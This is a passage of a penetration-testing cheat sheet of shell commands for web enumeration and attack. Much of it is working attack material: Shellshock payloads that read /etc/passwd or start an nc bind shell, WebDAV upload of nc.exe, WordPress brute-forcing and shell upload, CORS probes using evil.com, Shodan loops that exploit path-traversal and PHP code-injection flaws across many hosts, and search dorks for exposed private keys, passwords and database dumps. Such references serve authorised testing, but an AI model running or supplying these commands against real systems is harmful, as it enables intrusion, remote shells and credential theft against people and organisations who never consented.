    dirsearch -e $DIRSEARCH_EXTENSIONS -r -b -u -t $DIRSEARCH_THREADS --plain-text reports/dirsearch/$DIRSEARCH_FILE -u $host
done





## ---------------------------------------------------------------------------------- ##
##   [?] httprobe - Uses a list of domains and probes servers to see if they're up
## ---------------------------------------------------------------------------------- ##


##-========================================-##
##    [+] HTTProbe - 
##-========================================-##
httprobe
httprobe -s -p https:443


##-========================================-##
##    [+] HTTProbe - 
##-========================================-##
cat all.txt | httprobe -c $Concurrency -t $Timeout >> $Alive.txt


echo "## ------------------------------------------------------- ##"
echo "##   $(cat alive.txt | wc -l) Assets Are Responding"
echo "## ------------------------------------------------------- ##"



cat $Dir/$File.txt | httprobe cat $File.txt | httprobe -s -p https:443



##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] FeroxBuster - 
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



feroxbuster --url $URL -e -x .php,txt,html -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -o $Dir/ferox.out

feroxbuster --url $URL -e -x .php,txt,html -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -o $Dir/ferox.out



##-============================================================================-##
##    [+] Feroxbuster - Add PDF, Js, Html, PHP, Json, and Docx to Each URL:
##-============================================================================-##
feroxbuster --url $URL -x pdf -x js,html -x php txt json,docx


##-===================================================================-##
##    [+] Feroxbuster - IPv6 Non-Recursive Scan with Info LogLevel:
##-===================================================================-##
feroxbuster -u http://[::1] --no-recursion -vv


##-====================================================-##
##    [+] Feroxbuster - Proxy Traffic Through Burp:
##-====================================================-##
feroxbuster -u http://127.1 --insecure-proxy 127.0.0.1:8080


##-===================================================================-##
##    [+] Feroxbuster - Proxy Traffic Through OpenVPN SOCKS5 Proxy:
##-===================================================================-##
feroxbuster -u http://127.1 --proxy socks5h://10.8.0.1:1080


##-====================================================================-##
##    [+] Feroxbuster - Proxy Traffic Through Wireguard SOCKS5 Proxy:
##-====================================================================-##
feroxbuster -u http://127.1 --proxy socks5h://10.64.0.1:1080


##-===============================================================-##
##    [+] Feroxbuster - Proxy Traffic Through Tor SOCKS5 Proxy:
##-===============================================================-##
feroxbuster -u http://127.1 --proxy socks5h://127.0.0.1:9050


##-===============================================================-##
##    [+] Feroxbuster - Pass auth token via query parameter
##-===============================================================-##
feroxbuster -u http://127.1 --query token=0123456789ABCDEF


##-================================================================================-##
##    [+] Feroxbuster - IPv6, non-recursive scan with INFO-level logging enabled
##-================================================================================-##
feroxbuster -u http://[::1] --no-recursion -vv


##-==============================================-##
##    [+] Feroxbuster - Read urls from STDIN
##-==============================================-##
cat targets | feroxbuster --stdin --silent -s 200 301 302 --redirects -x js | fff -s 200 -o js-files


##-===================================================-##
##    [+] Feroxbuster - Proxy traffic through Burp
##-===================================================-##
feroxbuster -u http://127.1 --insecure --proxy http://127.0.0.1:8080



##-================================================================-##
##    [+] Feroxbuster - Brute force directories on a web server:
##-================================================================-##
cat subdomains_live_long.txt | feroxbuster --stdin --silent -k -n --auto-bail --random-agent -t 50 -T 3 --json -o feroxbuster_results.txt -s 200,301,302,401,403 -w directory-list-lowercase-2.3-medium.txt


##-================================================================-##
##    [+] Filter directories from the results:
##-================================================================-##
jq -r 'select(.status >= 200 and .status < 300) | .url | select(. != null)' feroxbuster_results.json | sort -uf | tee -a directories_2xx.txt

jq -r 'select(.status >= 300 and .status < 400) | .url | select(. != null)' feroxbuster_results.json | sort -uf | tee -a directories_3xx.txt

jq -r 'select(.status < 300 and .status >= 400) | .url | select(. != null)' feroxbuster_results.json | sort -uf | tee -a directories_3xx_none.txt

jq -r 'select(.status >= 400 and .status < 500) | .url | select(. != null)' feroxbuster_results.json | sort -uf | tee -a directories_4xx.txt

jq -r 'select(.status == 401) | .url | select(. != null)' feroxbuster_results.json | sort -uf | tee -a directories_401.txt

jq -r 'select(.status == 403) | .url | select(. != null)' feroxbuster_results.json | sort -uf | tee -a directories_403.txt



##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] Shellshock - Exploitation + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



##-=====================================-##
##   [+] NMap - Test for shell shock
##-=====================================-##
nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/admin.cgi $IP



## ------------------------------------------------------ ##
##   [?] git clone https://github.com/nccgroup/shocker
## ------------------------------------------------------ ##
./shocker.py -H TARGET --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose



##-=========================================-##
##   [+] Shell Shock - SSH Forced Command  
##-=========================================-##
## ----------------------------------------------------------------------- ##
##   [?] Check for forced command by enabling all debug output with ssh  
## ----------------------------------------------------------------------- ##
ssh -vvv  
ssh -i noob noob@$IP '() { :;}; /bin/bash'


##-====================================================-##
##   [+] Shell Shock - cat file (view file contents)  
##-====================================================-##
echo -e "HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () {:;}; echo \\$(</etc/passwd)\\r\\nHost:vulnerable\\r\\nConnection: close\\r\\n\\r\\n" | nc TARGET 80


##-=======================================-##
##   [+] Shell Shock - run bind shell  
##-=======================================-##
echo -e "HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () {:;}; /usr/bin/nc -l -p 9999 -e /bin/sh\\r\\nHost:vulnerable\\r\\nConnection: close\\r\\n\\r\\n" | nc TARGET 80




##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	            [+] Git - OSINT Recon
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



## --------------------------------------------------------------------- ##
##   [?] GitHarvester - 
## --------------------------------------------------------------------- ##


## --------------------------------------------------------------------- ##
##   [?] TruffleHog - Searches through git repositories for secrets
## --------------------------------------------------------------------- ##


## --------------------------------------------------------------------- ##
##   [?] LinkedInt
## --------------------------------------------------------------------- ##


## --------------------------------------------------------------------- ##
##   [?] CrossLinked
## --------------------------------------------------------------------- ##




## ------------------------------------------------------------------- ##
##   [?] BruteSpray - Bruteforce default credentials using Medusa
## ------------------------------------------------------------------- ##

brutespray

brutex-masscan









##-========================================-##
##    [+] Uniscan - Directory Finder
##-========================================-##
uniscan -qweds -u http://$Domain



## ---------------------------------------------------------------------------------------------- ##
###  [?] Parsero - reads the Robots.txt file of a web server and looks at the Disallow entries.
## ---------------------------------------------------------------------------------------------- ##
parsero -u $Domain -sb


## -------------------------------------------- ##
###  [?] ffuf - bruteforce web directories
## -------------------------------------------- ##
ffuf -w /path/to/wordlist -u https://target/FUZZ




##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] WebDAV - Web Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


##-=========================================-##
##    [+] Davtest - WebDAV Server Testing
##-=========================================-##
davtest -url http://target-IP


## ------------------------------------------------------ ##
###  [?] tries to upload (executable) files to WebDAV
## ------------------------------------------------------ ##
davtest -url http://target-ip/ -sendbd auto


enable the PUT method
davtest -move -sendbd auto -url http://$ip




##-======================================-##
##    [+] Metasploit - WebDAV Scanner
##-======================================-##
msfconsole
use auxiliary/scanner/http/webdav_scanner


for i in $(cat 80.txt); do cadaver -t $i; done


##-======================================-##
##    [+] cUrl - WebDAV - Upload files
##-======================================-##
curl -T nc.exe http://targetIP/nc.txt
curl -X MOVE -v -H "Destination:http://targetIP/nc.exe" http://targetIP/nc.txt










##-===========================-##
##  [+] Skipfish Scanning:
##-===========================-##
## ---------------------------------------------- ##
##  skipfish -m     time threads
##  skipfish -LVY   do not update after result
## ---------------------------------------------- ##
skipfish -m 5 -LVY -W /usr/share/skipfish/dictionaries/complete.wl -u http://$IP




skipfish -o /tmp/$File $Domain








urlsnarf

knocker





##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##      [+] Wordpress - Vulnerability Scanning + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


  Wordpress default uri and form names:
  * Default uri:<code>wp-login.php</code>
  * Default uservar: <code>log</code>
  * Default passvar: <code>pwd</code>

http-wordpress-brute



##-==================================================-##
##   [+] WPScan - Wordpress Vulnerability Scanner
##-==================================================-##
wpscan -v --url $1 --update -e vp,vt,tt,cb,dbe,u,m --plugins-detection aggressive --plugins-version-detection aggressive -f cli-no-color 2>&1 | tee /var/log/$WPScan.log



wpscan --url $Domain --batch



wpscan -u $Domain -e u vp vt -r



cd /usr/share/wpscan/
stop_user_enumeration_bypass.rb $Domain --ids 1-1000



##-=============================================-##
##   [+] THC-Hydra - Brute Force - Wordpress:
##-=============================================-##
hydra -v $Domain http-form-post "wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location" -l admin -P $PassFile


hydra -L $UserList -P $PassFile.txt $Domain http-head -f  -m /


##-=========================================================-##
##   [+] THC-Hydra - Brute Force - Wordpress Admin Login:
##-=========================================================-##
hydra -l $User -P $PassFile.txt $IP -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'


##-===========================================-##
##   [+] Patator - Brute Force - Wordpress:
##-===========================================-##
patator http_fuzz url=http://$IP/wp-login.php  raw_request=rawlogin 0=/usr/share/rockyou.txt -l /tmp/login &; tail -f /tmp/login | grep 302



##-===========================================-##
##   [+] Metasploit - Wordpress Upload Shell
##-===========================================-##
msf > use exploit/unix/webapp/wp_admin_shell_upload
msf exploit(wp_admin_shell_upload) > set RHOST $IP
msf exploit(wp_admin_shell_upload) > set USERNAME $User
msf exploit(wp_admin_shell_upload) > set PASSWORD $Pass
msf exploit(wp_admin_shell_upload) > set TARGETURI /
msf exploit(wp_admin_shell_upload) > run




## -------------------------------------------------------- ##
##   [?] cmseek - CMS Detection and Exploitation suite
## -------------------------------------------------------- ##
## 
## ------------------------------------------------- ##
##   [?] plecost - Wordpress fingerprinting tool
## ------------------------------------------------- ##



##-===========================================-##
##   [+] WPScan - 
##-===========================================-##
wpscan --url http://$IP
wpscan --url http://$IP --enumerate vp      ## vp = Vulnerable Plugins
wpscan --url http://$IP --enumerate vt      ## vt = Vulnerable Themes
wpscan --url http://$IP --enumerate u       ##  u = Users


##-==================================================================================-##
##   [+] WPScan - Enumerate Vulnerable Plugins, Users, Vulrenable Themes, Timthumbs
##-==================================================================================-##
wpscan --url http://$IP --enumerate vp,u,vt,tt --follow-redirection --verbose --log $File.log



##-===========================================-##
##   [+] WPScan - 
##-===========================================-##
wpscan --url $URL --disable-tls-checks --enumerate u,t,p


##-===========================================-##
##   [+] WPScan - 
##-===========================================-##
wpscan --url $URL -U $User -P $Pass.txt -t 50 


##-===========================================-##
##   [+] WPScan - 
##-===========================================-##
wpscan --username $User --url $URL --wordlist $File --threads 10


##-===========================================-##
##   [+] WPScan - 
##-===========================================-##
wpscan --url $IP/blog --proxy $IP:3129



##-===========================================-##
##   [+] Joomscan - 
##-===========================================-##
joomscan -u  http://$IP 
joomscan -u  http://$IP --enumerate-components



##-===========================================-##
##   [+] Droopescan - 
##-===========================================-##
droopescan scan wordpress -u http://$IP/moodle/



##-===========================================-##
##   [+] CMS Explorer - 
##-===========================================-##
cms-explorer -url http://$IP -type 
cms-explorer -url http://$IP -type Drupal
cms-explorer -url http://$IP -type WordPress
cms-explorer -url http://$IP -type Joomla
cms-explorer -url http://$IP -type Mambo



## ----------------------------------------------------------------------------- ##
##    [?] Wig - WebApp Info Gathering Tool - Identify Content Management Systems
## ----------------------------------------------------------------------------- ##


## ----------------------------------------------------------------------------- ##
	  wig -l $InFile          ##  [?] File with urls, one per line
## ----------------------------------------------------------------------------- ##
	  wig -a                  ##  [?] Do not stop after the first CMS is detected
	  wig -m                  ##  [?] Try harder to find a match without making more requests
## ----------------------------------------------------------------------------- ##
	  wig -u $UserAgent       ##  [?] User-agent to use in the requests
	  wig -d                  ##  [?] Disable the search for subdomains
	  wig -t $NumThreads      ##  [?] Number of threads to use
## ----------------------------------------------------------------------------- ##
	  wig --no_cache_load     ##  [?] Do not load cached responses
	  wig --no_cache_save     ##  [?] Do not save the cache for later use
## ----------------------------------------------------------------------------- ##
	  wig --verbosity         ##  [?] Increase verbosity. 
                              ##  [?] Use multiple times for more info
## ----------------------------------------------------------------------------- ##
	  wig -w $OutFile         ##  [?]  [?] File to dump results into (JSON)
## ----------------------------------------------------------------------------- ##


## ----------------------------------------------------------------------------- ##
	  wig --proxy 10.8.0.1:1080       ##  [?] Tunnel through OpenVPN proxy
	  wig --proxy 10.64.0.1:1080      ##  [?] Tunnel through WireGuard proxy
## ----------------------------------------------------------------------------- ##






clusterd.py --fingerprint  -i $IP


BlindElephant.py $IP


vuls



wapiti $Domain -n 10 -b folder -u -v 1 -f html -o /tmp/scan_report



python $CMSMAP -t $Domain


##-=============================================-##
##   [+] CMSMap - Update the CMSMap Database:
##-=============================================-##
cmsmap.py -U PC


##-=============================================-##
##   [+] CMSMap - Run in file mode:
##-=============================================-##
cmsmap.py -i $File.txt -t 200 -F -s -o $Results.txt



##-=============================================-##
##   [+] CMSMap - 
##-=============================================-##
cmsmap.py $Domain -i $Targets.txt -o $Output.txt



##-=============================================-##
##   [+] CMSMap - 
##-=============================================-##
cmsmap.py $Domain -u admin -p $Passwords.txt


##-=============================================-##
##   [+] CMSMap - 
##-=============================================-##
cmsmap.py $Domain -k $Hashes.txt -w $Passwords.txt



## --------------------------------- ##
##  [+] Scraping wayback data...
## --------------------------------- ##
cat $url/recon/final.txt | waybackurls | tee -a  $url/recon/wayback/wayback_output1.txt
sort -u $url/recon/wayback/wayback_output1.txt >> $url/recon/wayback/wayback_output.txt


cat domains.txt | waybackurls > urls




##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##      [+] Cross Origin Resource Sharing (CORS)
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



##-========================================-##
##   [+] FFUF - CORS Bruteforcing
##-========================================-##
## ---------------------------------------------------------------------------- ##
##   [?] Find pages that only return the header Access-Control-Allow-Origin 
##       when a valid domain is set in the origin header
##   [?] Abuse CORS behavior - discover new subdomains
## ---------------------------------------------------------------------------- ##
ffuf -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u $IP -H 'Origin: http://FUZZ.crossfit.htb' -mr "Access-Control-Allow-Origin" -ignore-body




ffuf --hc 400,404,403 -H "Host: FUZZ.$Domain" -u $Domain -t 100 -u $Domain -H "Host: FUZZ.$Domain"



##-====================================================-##
##   [+] Curl - Cross Origin Resource Sharing (CORS)
##-====================================================-##
curl --head -s '$Domain.com/api/v1/secret' -H 'Origin: $Domain'

"Access-Control-Allow-Origin"


##-============================================================-##
##   [+] Curl - is Access-Control-Allow-Credentials enabled?
##-============================================================-##
curl -vs "$url" -H"Origin: $origin" 2>&1 | grep -i "< Access-Control-Allow-Origin: $origin"
curl -vs "$url" -H"Origin: $origin" 2>&1 | grep -i "< Access-Control-Allow-Credentials: true





##-==========================================-##
##   [+] Cors Misconfigration - One Liners
##-==========================================-##
cors_reflect_auto(){
        gau $1 | while read url;do target=$(curl -s -I -H "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found]echo $url;$url;else echo Nothing on "$url";fi;done
}


cors_null_origin(){
        gau $1 | while read url;do target=$(curl -s -I -H "Origin: null" -X GET $url) | if grep 'Access-Control-Allow-Origin: null'; then echo [Potentional CORS Found] "$url"; else echo Nothing on: "$url";fi;done

}


cors_null_value(){
        gau $1 | while read url;do target=$(curl -s -I -X GET "$url") | if grep 'Access-Control-Allow-Origin: null'; then echo [Potentional CORS Found] "$url"; else echo Nothing on: "$url";fi;done
}


cors_trust_subdomain(){
        gau $1 | while read url;do target=$(curl -s -I -H "Origin: evil.$url" -X GET "$url") | if grep 'Access-Control-Allow-Origin: null'; then echo [Potentional CORS Found] "$url"; else echo Nothing on: "$url";fi;done
}


cors_domain_not_valid(){
        gau $1 | while read url;do target=$(curl -s -I -H "Origin: https://not$site" -X GET "$url") | if grep 'Access-Control-Allow-Origin: https://not$site'; then echo [Potentional CORS Found] "$url"; else echo Nothing on: "$url";fi;done
}

cors_dom_ext(){
        gau $1 | while read url;do target=$(curl -s -I -H "Origin: $site.evil.com" -X GET "$url") | if grep "Origin: Access-Control-Allow-Origin: $site.evil.com";  then echo [Potentional CORS Found] "$url"; else echo Nothing on: "$url";fi;done
}



##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##      [+] Cisco - Router Vulnerability Scanning
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##





## -------------------------------------------------------------------------- ##
##    [?] cisco-auditing-tool - Scans Cisco routers for vulnerabilities
## -------------------------------------------------------------------------- ##

cisco-auditing-tool




## -------------------------------------------------------------------------- ##
##    [?] cisco-torch - Mass Cisco router vulnerability Scanner
## -------------------------------------------------------------------------- ##
##    [?] Discover remote Cisco hosts running: 
##        Telnet, SSH, Web, NTP, TFTP and SNMP services
## -------------------------------------------------------------------------- ##
##    [?] Dicitionary attack services discovered
## -------------------------------------------------------------------------- ##


cisco-torch -A $TARGET



cisco-torch -A 192.168.99.202
copy-router-config.pl 192.168.1.1 192.168.1.15 private
merge-router-config.pl 192.168.1.1 192.168.1.15 private




##-======================================-##
##   [+] Get Cisco network information
##-======================================-##
tcpdump -nn -v -i eth0 -s 1500 -c 1 'ether[20:2] == 0x2000'






##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] OSINT - Search Engine Dorks - Recon
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


##-===================================-##
##   [+] OSINT - Search Engine Dorks
##-===================================-##


##-=======================================-##
##    [+] GoogleDorks - Search for APIs
##-=======================================-##
intitle:"index of" intext:"apikey.txt"
intext:APIKey
site:$Domain.tld inurl:api
intitle:"index of" "api.yaml"
intitle:"index of" intext:"apikey.txt" site:target.tld
allintext:"API_SECRET*" ext:env | ext:yml site:target.tld

##  Developer API File:
openapi.json 


ext:(doc | pdf | xls| txt | xml | odt | html) intext:APIKey
ext:(doc | pdf | xls| txt | xml | odt | html) allintext:"APIKey"
ext:(doc|pdf|xls|txt|xml|odt|html) allintext:"APIKey"
ext:doc | ext:pdf | ext:xls | ext:txt | ext:xml | ext:odt allintext:"APIKey"


allintext:"API_SECRET*" ext:env | ext:yml



filetype:pdf OR filetype:doc OR filetype:ppt OR filetype:xls



inurl:conf OR inurl:config OR inurl:cfg
filetype:config inurl:web.config inurl:ftp

-inurl:(jsp|php|html|aspx|htm|cf|shtml)
(pdf|txt|epub|doc|docx)


site:pastebin.com | site:github.com
(site:instagram.com | site:twitter.com) (intext:"admin")

inurl:example.com intitle:"index of /" "*key.pem"
inurl:example.com ext:log
inurl:example.com intitle:"index of" ext:sql|xls|xml|json|csv
inurl:example.com "MYSQL_ROOT_PASSWORD:" ext:env OR ext:yml -git
inurl:example.com intitle:"index of" "config.db"
inurl:example.com allintext:"API_SECRET*" ext:env | ext:yml
inurl:example.com intext:admin ext:sql inurl:admin
inurl:example.com allintext:username,password filetype:log
site:example.com "-----BEGIN RSA PRIVATE KEY-----" inurl:id_rsa
site:google.com "keyword"
site:pastebin.com "keyword"
inurl:gitlab "keyword"
inurl:github "keyword"
site:bitbucket.org "keyword"
intitle:"Index of" config.php
filetype:bak inurl:"htaccess|passwd|shadow|htusers

inurl:".php?id=" "You have an error in your SQL syntax"
(inurl:"robot.txt" | inurl:"robots.txt" ) intext:disallow filetype:txt
intitle:"Apache Tomcat" "Error Report"
inurl:/login.asp "Configuration and Management"


##-======================-##
##   [+] Shodan Dorks
##-======================-##
shodan search http.favicon.hash:-335242539 "3992" --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl --silent --path-as-is --insecure "https://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" | grep -q root && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done
shodan domain DOMAIN TO BOUNTY | awk '{print $3}' | httpx -silent | nuclei -t /nuclei-templates/

http.favicon.hash:-601665621 --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl -s http://$host/ajax/render/widget_tabbedcontainer_tab_panel -d 'subWidgets[0][template]=widget_php&subWidgets[0][config][code]=phpinfo();' | grep -q phpinfo && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done;


## Serial Numbers Leak :
inurl:(service | authors | administrators | users) ext:pwd "# -FrontPage-"


## IP Cameras:
Axis : inurl:/view.shtml or inurl:view/index.shtml
Canon : sample/LvAppl/
MOBOTIX : control/userimage.html
FlexWatch : /app/idxas.html
JVC : intitle:”V.Networks [Motion Picture(Java)]”

intitle:"index of" intext:"Includes wordpress"
intitle:"netscaler gateway" intext:password "please log on"

intitle:"index of" intext:"Includes
inurl:old "index of" "wp-config.php"
inurl:9000 AND intext:"Continuous Code Quality"
s3 site:amazonaws.com filetype:sql
intext:"wordpress" filetype:xls login & password
"Web Analytics powered by Open Web Analytics v: 1.6.2"
intitle:"Outlook Web Access" | "Outlook Web app" -office.com -youtube.com -microsoft.com
inurl:"CookieAuth.dll?GetLogon?" intext:log on

s3 site:amazonaws.com filetype:xls login
s3 site:amazonaws.com filetype:xls password
intext:backup.sql intitle:index.of
intext:user.sql intitle:index.of




inurlbr.php --dork "site:$Domain" -s inurlbr-$Target

inurlbr.php --dork "filetype:jsp | filetype:bak | filetype:asp | filetype:php | filetype:cgi | filetype:sql | filetype:pl | filetype:py | filetype:aspx | filetype:rb | filetype:do' inurl:'$TARGET' site:'$TARGET'" -s $TARGET-extensions.txt
inurlbr.php --dork '(inurl:"redir=" AND inurl:"http") OR (inurl:"url=" AND inurl:"http") OR (inurl:"target=" AND inurl:"http") OR (inurl:"dst=" AND inurl:"http") OR (inurl:"src=" AND inurl:"http") OR (inurl:"redirect=" AND inurl:"http") AND site:'"$TARGET" -s $TARGET-openredirect.txt
inurlbr.php --dork "'site:pastbin.com' $TARGET" -s $TARGET-pastebin.txt




atscan --dork "site:gov.il ext:txt|xlsx|csv" --motor google --level 5 


atscan --dork dork.txt --motor google --level 5


interactive mode
atscan --interactive





## ---------------------------------------- ##
##   [?] Search For Directory Listings: 
## ---------------------------------------- ##
intitle: index.of name size site: target.com 

## ---------------------------------------- ##
##   [?] Search for special directories:
## ---------------------------------------- ##
intitle: index.of.admin site: target.com

## ------------------------------------------ ##
##   [?] Search for the admin directories:
## ------------------------------------------ ##
intitle: index.of inurl: admin site: target.com 


## ----------------------------------- ##
##   [?] Search for special files:
## ----------------------------------- ##
intitle: index.of ws_ftp.log site: target.com

## ----------------------------------- ##
##   [?] Search for ws_ftp.log file:
## ----------------------------------- ##
filetype: log inurl: ws_ftp.log site: target.com 


## -------------------------------------------------- ##
##   [?] Determine the version of the web server:
## -------------------------------------------------- ##
intitle: index.of " server at "site: target.com 

## ----------------------------------------------------------------------- ##
##   [?] Search for sites with this required version of the web server:
## ----------------------------------------------------------------------- ##
intitle: index.of" Apache / 1.3.27 Server at " 


## ----------------------------------------------------------------------------- ##
##   [?] Search for sites with possible vulnerabilities Directory Traversal: 
## ----------------------------------------------------------------------------- ##
intitle: index.of inurl:" admin "


indexof:                        ## finding out the whole index a website is saving


inurl: login.php               ## find text contained in the URL

intitle: “login page”           ## find out the web titled “login page”


inurl:/wp-*/ shell.php
intext: /wp-*/
index of /wp-*/ wso.php
                                                            -

search in databases. 

Youre searching on the indexed parts of the information from the database

For information about the database itself 
or the potential location of the SQLinj attack, 

you can search for indexed error pages for specific phrases such as:

"SQL command not properly ended"

Another thing to pay attention to indexed database dumps
these dumps are displayed via the web interface and indexed by the search bot

then you can try to search them for the content of key phrases: 
"# Dumping data for table" (user | username | pass | password)


##-=========================================-##
##   [+] Look for SQL Dumps by Extension: 
##-=========================================-##
filetype: sql




##-=====================================-##
##   [+] Search for SMB config files
##-=====================================-##
inurl:"smb.conf" intext:"workgroup" filetype:conf


##-======================================================-##
##   [+] Search for files In FTP servers by extension:
##-======================================================-##
site:ftp://ftp.*.* ext:


##-==================================================-##
##   [+] Search for PDF files In AWS S3 Buckets:
##-==================================================-##
site:s3.amazonaws.com filetype:pdf



intitle:"SpeedStream Router Management Interface"


iceweasel "https://www.punkspider.org/#searchkey=url&searchvalue='$TARGET'&pagenumber=1&filterType=or&filters=bsqli,sqli,xss,trav,mxi,osci,xpathi" &



##-===================================-##
##   [+] Finding Live Axis Cameras
##-===================================-##
inurl = “/view/view.shtml?id-"


##-==========================-##
##   [+] GoogleDorks - SQL
##-==========================-##
"index of" "database.sql.zip" | filetype:sql intext:password
ext:sql | ext:dbf | ext:mdb
intext:"sql syntax near" | intext:"syntax error has occurred" | intext:"incorrect syntax near" | intext:"unexpected end of SQL command" | intext:"Warning: mysql_connect()" | intext:"Warning: mysql_query()" | intext:"Warning: pg_connect()"
site:target.com intitle:”index of” db_backup.sql | db.sql | database.sql | sql | .sql.gz | .sql.bz2


##-================================-##
##   [+] GoogleDorks - WordPress
##-================================-##
intitle:"Index of" wp-admin



##-=============================-##
##   [+] GoogleDorks - cgi-bin
##-=============================-##
inurl:/cgi-bin/
inurl:/cgi-bin/ + intext:”User ID” + intext:”Password”
inurl:/cgi-bin/login.cgi

Juicy files/Pages

intext:"budget approved") inurl:confidential


##-=============================-##
##   [+] GoogleDorks - Apache2
##-=============================-##
intitle:"Apache2 Ubuntu Default Page: It works"


##-==================================-##
##   [+] GoogleDorks - Zoom Videos
##-==================================-##
inurl:zoom.us/j AND intext:"scheduled for"


##-========================================-##
##   [+] GoogleDorks - SSH private keys
##-========================================-##
intitle:index.of id_rsa -id_rsa.pub
intitle:"Index of /" ".ssh"

##-=================================-##
##   [+] GoogleDorks - email list
##-=================================-##
filetype:xls inurl:"email.xls"

##-================================-##
##   [+] GoogleDorks - ENV files
##-================================-##
inurl:.env | filetype:.env | ext:env
filetype:env intext:DB_USERNAME


intitle:"index of"
inurl:"/private"
intitle:"index of" "local.json"
Fwd: intitle:"Index of /" intext:"resource/"
filetype:xls + password + inurl:.com
site:gov.* intitle:"index of" *.pptx
docs.google.com/spreadsheets
"microsoft internet information services" ext:log
inurl:src/viewcvs.cgi/log/.c?=
intitle:"welcome.to.squeezebox"
intitle:"index of" "mysql.properties"
inurl: /wp-content/uploads/ inurl:"robots.txt" "Disallow:" filetype:txt
inurl:"/horde/test.php"
filetype:gitattributes intext:CHANGELOG.md -site:github.com
ext:txt | ext:log | ext:cfg | ext:yml "administrator:500:"
intitle: index of "*db.tar.gz"
inurl:admin filetype:xlsx site:gov.*
Index of" intext:"source_code.zip
inurl:"htaccess|passwd|shadow|htusers"
“config.yml” | intitle:”index of” “config.yml”
intitle:"index of" "config.txt"
inurl:/wp-content/uploads/wpo_wcpdf
intext:"ArcGIS REST Services Directory" intitle:"Folder: /"
allintitle:"macOS Server" site:.edu
inurl:wp-content/uploads/sites
intitle:"index of" "private.properties"
intitle:"SCM Manager" intext:1.60
intitle:"index of" "profiler"
intitle:"index of" "main.yml"
intitle:"Index of" inurl:/backup/ "admin.zip"
intitle:"index of" google-maps-api
intitle:"index of" github-api
inurl:uploadimage.php
intitle: "index of" "/backup.sql"
intitle:"Sharing API Info"
inurl:user intitle:"Drupal" intext:"Log in" -"powered by"
inurl: /libraries/joomla/database/
"web.config" | inurl:/conf/ | "error_log"
intitle:"Index of /" + ".htaccess"
intitle:"index of /.git" "paren directory"
inurl:Makefile.toml


##-======================================-##
##   [+] GoogleDorks - Govermment docs
##-======================================-##
allintitle: restricted filetype:doc site:gov


##-============================-##
##   [+] GoogleDorks - PDFs
##-============================-##
intitle: index of pdf | ext:pdf | inurl:.pdf
filetype:pdf “Confidential” | “Secret” | “Classified”






10-Dorks
	    -site.com +inurl:dev -cdn
	    site:documenter.getpostman.com yahoo.com
	    site:getpostman.com yahoo data
		- site:site.com -www.site.com -www.sanbox
		- site:target.com filetype:php
		- site:target.com filetype:aspx
		- site:target.com filetype:swf (Shockwave Flash)
		- site:target.com filetype:wsdl
		- site: target.com inurl:.php?id=
		- site: target.com inurl:.php?user=
		- site: target.com inurl:.php?book=
		- site: target.com inurl:login.php
		- site: target.com intext: “login”
